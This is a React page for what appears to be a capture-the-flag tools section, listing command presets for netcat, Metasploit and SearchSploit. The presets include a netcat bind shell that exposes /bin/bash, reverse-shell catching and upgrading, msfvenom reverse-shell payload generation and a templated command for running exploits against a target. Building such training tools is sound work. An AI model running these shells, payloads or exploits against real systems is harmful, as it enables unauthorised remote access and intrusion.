"use client";

import { useState } from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { ArrowLeft, Shield } from "lucide-react";
import Link from 'next/link';
import { ToolExecutor } from '../lib/tool-executor';
import { Tool } from '../lib/types';

const netcat: Tool = {
  id: 'netcat',
  name: 'Netcat',
  description: 'The TCP/IP Swiss Army Knife',
  longDescription: 'Netcat (nc) is a versatile networking utility that reads and writes data across network connections. It can function as a simple TCP/UDP client or server, making it invaluable for debugging, port scanning, file transfers, and setting up reverse shells.',
  installCmd: 'apt-get install -y netcat-openbsd',
  checkCmd: 'which nc',
  documentation: 'https://man.openbsd.org/nc',
  presets: [
    {
      id: 'connect',
      name: 'Connect to Port',
      level: 'basic',
      description: 'Connect to a remote host and port',
      command: 'nc -v {host} {port}',
      args: [
        { name: 'host', placeholder: 'target.com', description: 'Target hostname or IP', required: true, type: 'text' },
        { name: 'port', placeholder: '80', description: 'Target port', required: true, type: 'number' },
      ],
      notes: ['-v enables verbose mode', 'Interactive connection - type to send data', 'Ctrl+C to disconnect'],
    },
    {
      id: 'listener',
      name: 'Start Listener',
      level: 'basic',
      description: 'Listen on a port for incoming connections',
      command: 'nc -lvnp {port}',
      args: [
        { name: 'port', placeholder: '4444', description: 'Port to listen on', required: true, type: 'number' },
      ],
      notes: ['-l listen mode', '-v verbose', '-n no DNS', '-p port', 'Common for catching reverse shells'],
    },
    {
      id: 'port-scan',
      name: 'Port Scan',
      level: 'intermediate',
      description: 'Scan a range of ports',
      command: 'nc -zv {host} {start}-{end}',
      args: [
        { name: 'host', placeholder: '192.168.1.1', description: 'Target host', required: true, type: 'text' },
        { name: 'start', placeholder: '1', description: 'Start port', required: true, type: 'number', default: '1' },
        { name: 'end', placeholder: '1000', description: 'End port', required: true, type: 'number', default: '1000' },
      ],
      notes: ['-z scan mode (no data sent)', 'Basic scan - use nmap for detailed scanning'],
    },
    {
      id: 'banner-grab',
      name: 'Banner Grab',
      level: 'intermediate',
      description: 'Grab service banner from port',
      command: 'echo "" | nc -v -w 3 {host} {port}',
      args: [
        { name: 'host', placeholder: '192.168.1.1', description: 'Target host', required: true, type: 'text' },
        { name: 'port', placeholder: '22', description: 'Service port', required: true, type: 'number' },
      ],
      notes: ['-w 3 sets 3 second timeout', 'Useful for service identification'],
    },
    {
      id: 'file-transfer-listen',
      name: 'Receive File',
      level: 'advanced',
      description: 'Listen and save incoming data to file',
      command: 'nc -lvnp {port} > {output}',
      args: [
        { name: 'port', placeholder: '9999', description: 'Listen port', required: true, type: 'number' },
        { name: 'output', placeholder: '/tmp/received.bin', description: 'Output file', required: true, type: 'text' },
      ],
      notes: ['Sender: nc target_ip port < file', 'No encryption - use for internal networks only'],
    },
    {
      id: 'file-transfer-send',
      name: 'Send File',
      level: 'advanced',
      description: 'Send a file to remote listener',
      command: 'nc -v {host} {port} < {file}',
      args: [
        { name: 'host', placeholder: '192.168.1.1', description: 'Target with listener', required: true, type: 'text' },
        { name: 'port', placeholder: '9999', description: 'Target port', required: true, type: 'number' },
        { name: 'file', placeholder: '/tmp/file.bin', description: 'File to send', required: true, type: 'text' },
      ],
    },
    {
      id: 'reverse-shell',
      name: 'Reverse Shell Catcher',
      level: 'expert',
      description: 'Catch a reverse shell with PTY upgrade',
      command: 'nc -lvnp {port}',
      args: [
        { name: 'port', placeholder: '4444', description: 'Listen port', required: true, type: 'number' },
      ],
      notes: [
        'After catching shell, upgrade with:',
        'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
        'Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm',
      ],
    },
    {
      id: 'bind-shell',
      name: 'Bind Shell',
      level: 'expert',
      description: 'Create a bind shell listener (for testing)',
      command: 'nc -lvnp {port} -e /bin/bash',
      args: [
        { name: 'port', placeholder: '4444', description: 'Listen port', required: true, type: 'number' },
      ],
      notes: ['Creates shell accessible on the port', 'Only works with netcat-traditional (nc.traditional)', 'For testing only - very dangerous in production'],
      dangerous: true,
    },
  ],
};

const msfconsole: Tool = {
  id: 'msfconsole',
  name: 'Metasploit Framework',
  description: 'Advanced exploitation framework',
  longDescription: 'Metasploit Framework is the world\'s most used penetration testing software. It provides information about security vulnerabilities, aids in penetration testing and IDS signature development. Includes exploits, payloads, encoders, and auxiliary modules.',
  installCmd: 'apt-get install -y metasploit-framework || curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall',
  checkCmd: 'which msfconsole',
  documentation: 'https://docs.metasploit.com/',
  presets: [
    {
      id: 'search',
      name: 'Search Exploits',
      level: 'basic',
      description: 'Search for exploits by keyword',
      command: 'msfconsole -q -x "search {keyword}; exit"',
      args: [
        { name: 'keyword', placeholder: 'apache', description: 'Search term (CVE, service, etc)', required: true, type: 'text' },
      ],
      notes: ['-q quiet mode', '-x execute commands', 'Search by name, CVE, platform, type'],
    },
    {
      id: 'search-cve',
      name: 'Search by CVE',
      level: 'basic',
      description: 'Find exploits for specific CVE',
      command: 'msfconsole -q -x "search cve:{cve}; exit"',
      args: [
        { name: 'cve', placeholder: '2021-44228', description: 'CVE number', required: true, type: 'text' },
      ],
    },
    {
      id: 'exploit-info',
      name: 'Exploit Information',
      level: 'intermediate',
      description: 'Get detailed info about an exploit',
      command: 'msfconsole -q -x "info {module}; exit"',
      args: [
        { name: 'module', placeholder: 'exploit/multi/http/apache_mod_cgi_bash_env_exec', description: 'Module path', required: true, type: 'text' },
      ],
      notes: ['Shows description, options, targets', 'Use "search" first to find module path'],
    },
    {
      id: 'handler',
      name: 'Multi Handler',
      level: 'intermediate',
      description: 'Start a handler for Meterpreter/shells',
      command: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run"',
      args: [
        { name: 'payload', placeholder: 'linux/x64/meterpreter/reverse_tcp', description: 'Payload type', required: true, type: 'select', options: [
          { value: 'linux/x64/meterpreter/reverse_tcp', label: 'Linux x64 Meterpreter TCP' },
          { value: 'linux/x86/meterpreter/reverse_tcp', label: 'Linux x86 Meterpreter TCP' },
          { value: 'windows/x64/meterpreter/reverse_tcp', label: 'Windows x64 Meterpreter TCP' },
          { value: 'windows/meterpreter/reverse_tcp', label: 'Windows x86 Meterpreter TCP' },
          { value: 'php/meterpreter/reverse_tcp', label: 'PHP Meterpreter TCP' },
          { value: 'java/meterpreter/reverse_tcp', label: 'Java Meterpreter TCP' },
          { value: 'generic/shell_reverse_tcp', label: 'Generic Reverse Shell' },
        ] },
        { name: 'lhost', placeholder: '10.10.10.10', description: 'Your IP address', required: true, type: 'text' },
        { name: 'lport', placeholder: '4444', description: 'Listen port', required: true, type: 'number', default: '4444' },
      ],
      notes: ['Catches reverse shells and meterpreter sessions', 'Match payload to what target will execute'],
    },
    {
      id: 'venom',
      name: 'Generate Payload',
      level: 'advanced',
      description: 'Create payload with msfvenom',
      command: 'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}',
      args: [
        { name: 'payload', placeholder: 'linux/x64/meterpreter/reverse_tcp', description: 'Payload', required: true, type: 'select', options: [
          { value: 'linux/x64/meterpreter/reverse_tcp', label: 'Linux x64 Meterpreter' },
          { value: 'linux/x64/shell_reverse_tcp', label: 'Linux x64 Shell' },
          { value: 'windows/x64/meterpreter/reverse_tcp', label: 'Windows x64 Meterpreter' },
          { value: 'windows/x64/shell_reverse_tcp', label: 'Windows x64 Shell' },
          { value: 'php/meterpreter/reverse_tcp', label: 'PHP Meterpreter' },
          { value: 'python/meterpreter/reverse_tcp', label: 'Python Meterpreter' },
          { value: 'java/jsp_shell_reverse_tcp', label: 'JSP Shell' },
        ] },
        { name: 'lhost', placeholder: '10.10.10.10', description: 'Your IP', required: true, type: 'text' },
        { name: 'lport', placeholder: '4444', description: 'Port', required: true, type: 'number', default: '4444' },
        { name: 'format', placeholder: 'elf', description: 'Output format', required: true, type: 'select', options: [
          { value: 'elf', label: 'ELF (Linux binary)' },
          { value: 'exe', label: 'EXE (Windows)' },
          { value: 'raw', label: 'Raw shellcode' },
          { value: 'php', label: 'PHP' },
          { value: 'py', label: 'Python' },
          { value: 'war', label: 'WAR (Java)' },
          { value: 'asp', label: 'ASP' },
          { value: 'aspx', label: 'ASPX' },
          { value: 'ps1', label: 'PowerShell' },
        ] },
        { name: 'output', placeholder: '/tmp/shell.elf', description: 'Output file', required: true, type: 'text' },
      ],
      notes: ['Match format to payload platform', 'Start handler before executing payload on target'],
      dangerous: true,
    },
    {
      id: 'db-nmap',
      name: 'Import Nmap Scan',
      level: 'advanced',
      description: 'Import nmap results into Metasploit',
      command: 'msfconsole -q -x "db_import {xmlfile}; hosts; services; exit"',
      args: [
        { name: 'xmlfile', placeholder: '/tmp/nmap_scan.xml', description: 'Nmap XML output file', required: true, type: 'text' },
      ],
      notes: ['Run nmap with -oX flag first', 'Enables vuln auto-matching'],
    },
    {
      id: 'run-exploit',
      name: 'Run Exploit',
      level: 'expert',
      description: 'Execute a specific exploit',
      command: 'msfconsole -q -x "use {module}; set RHOSTS {target}; set LHOST {lhost}; set LPORT {lport}; run; exit"',
      args: [
        { name: 'module', placeholder: 'exploit/linux/http/apache_mod_cgi_bash_env_exec', description: 'Exploit module path', required: true, type: 'text' },
        { name: 'target', placeholder: '192.168.1.1', description: 'Target IP/hostname', required: true, type: 'text' },
        { name: 'lhost', placeholder: '10.10.10.10', description: 'Your IP for reverse connection', required: true, type: 'text' },
        { name: 'lport', placeholder: '4444', description: 'Your listen port', required: true, type: 'number', default: '4444' },
      ],
      notes: ['Some exploits need additional options', 'Use "show options" to see all settings', 'Always have permission before exploiting'],
      dangerous: true,
    },
  ],
};

const searchsploit: Tool = {
  id: 'searchsploit',
  name: 'SearchSploit',
  description: 'Exploit-DB command-line search tool',
  longDescription: 'SearchSploit is a command-line tool for searching the Exploit Database archive. It allows you to search for exploits, shellcodes, papers, and more offline. The database is regularly updated and contains thousands of exploits.',
  installCmd: 'apt-get install -y exploitdb || searchsploit -u',
  checkCmd: 'which searchsploit',
  documentation: 'https://www.exploit-db.com/searchsploit',
  presets: [
    {
      id: 'search',
      name: 'Basic Search',
      level: 'basic',
      description: 'Search for exploits by keyword',
      command: 'searchsploit {query}',
      args: [
        { name: 'query', placeholder: 'apache 2.4', description: 'Search terms (software, version)', required: true, type: 'text' },
      ],
      notes: ['Searches title and path', 'Use multiple terms for specific results'],
    },
    {
      id: 'exact',
      name: 'Exact Match',
      level: 'intermediate',
      description: 'Search with exact version matching',
      command: 'searchsploit -e "{query}"',
      args: [
        { name: 'query', placeholder: 'WordPress 5.0', description: 'Exact search term', required: true, type: 'text' },
      ],
      notes: ['-e requires exact match', 'Useful for specific versions'],
    },
    {
      id: 'json',
      name: 'JSON Output',
      level: 'intermediate',
      description: 'Get results in JSON format',
      command: 'searchsploit -j {query}',
      args: [
        { name: 'query', placeholder: 'apache', description: 'Search terms', required: true, type: 'text' },
      ],
      notes: ['Useful for scripting', 'Includes EDB-ID and paths'],
    },
    {
      id: 'examine',
      name: 'Examine Exploit',
      level: 'intermediate',
      description: 'View exploit code',
      command: 'searchsploit -x {path}',
      args: [
        { name: 'path', placeholder: 'linux/local/40839.c', description: 'Exploit path from search results', required: true, type: 'text' },
      ],
      notes: ['Opens exploit in pager', 'Review before using!'],
    },
    {
      id: 'mirror',
      name: 'Copy Exploit',
      level: 'advanced',
      description: 'Copy exploit to current directory',
      command: 'searchsploit -m {path}',
      args: [
        { name: 'path', placeholder: 'linux/local/40839.c', description: 'Exploit path', required: true, type: 'text' },
      ],
      notes: ['Copies to current directory', 'May need modifications before use'],
    },
    {
      id: 'nmap',
      name: 'Import Nmap Results',
      level: 'advanced',
      description: 'Find exploits from nmap service scan',
      command: 'searchsploit --nmap {xmlfile}',
      args: [
        { name: 'xmlfile', placeholder: '/tmp/nmap.xml', description: 'Nmap XML output', required: true, type: 'text' },
      ],
      notes: ['Run nmap with -sV -oX first', 'Auto-matches services to exploits'],
    },
    {
      id: 'update',
      name: 'Update Database',
      level: 'basic',
      description: 'Update the exploit database',
      command: 'searchsploit -u',
      args: [],
      notes: ['Updates from exploit-db.com', 'Run periodically for latest exploits'],
    },
    {
      id: 'advanced',
      name: 'Advanced Search',
      level: 'expert',
      description: 'Filter by type and platform',
      command: 'searchsploit -t {type} --exclude="{exclude}" {query}',
      args: [
        { name: 'query', placeholder: 'privilege escalation', description: 'Search terms', required: true, type: 'text' },
        { name: 'type', placeholder: 'local', description: 'Exploit type filter', required: true, type: 'select', options: [
          { value: 'local', label: 'Local exploits' },
          { value: 'remote', label: 'Remote exploits' },
          { value: 'webapps', label: 'Web application' },
          { value: 'dos', label: 'Denial of Service' },
          { value: 'shellcode', label: 'Shellcodes' },
        ] },
        { name: 'exclude', placeholder: 'PoC', description: 'Terms to exclude', required: false, type: 'text' },
      ],
      notes: ['-t filters by type', '--exclude removes unwanted results'],
    },
  ],
};

export default function ExploitToolsPage() {
  const [selectedTool, setSelectedTool] = useState<string>('netcat');

  const tools: Record<string, Tool> = { netcat, msfconsole, searchsploit };

  return (
    <div className="flex flex-1 flex-col gap-4 p-4 pt-6">
      <div className="flex items-center gap-4">
        <Button variant="ghost" size="sm" asChild>
          <Link href="/app/ctf/tools">
            <ArrowLeft className="h-4 w-4 mr-1" /> Back
          </Link>
        </Button>
        <div className="flex items-center gap-2">
          <div className="p-2 rounded-lg bg-primary/10 border border-primary/30">
            <Shield className="h-5 w-5 text-primary" />
          </div>
          <div>
            <h2 className="text-xl font-semibold">Exploitation Tools</h2>
            <p className="text-xs text-muted-foreground">Shells, exploits, and payload generation</p>
          </div>
        </div>
      </div>

      <Tabs value={selectedTool} onValueChange={setSelectedTool} className="flex-1">
        <TabsList>
          <TabsTrigger value="netcat">Netcat</TabsTrigger>
          <TabsTrigger value="msfconsole">Metasploit</TabsTrigger>
          <TabsTrigger value="searchsploit">SearchSploit</TabsTrigger>
        </TabsList>
        
        {Object.entries(tools).map(([id, tool]) => (
          <TabsContent key={id} value={id} className="mt-4">
            <ToolExecutor tool={tool} />
          </TabsContent>
        ))}
      </Tabs>
    </div>
  );
}

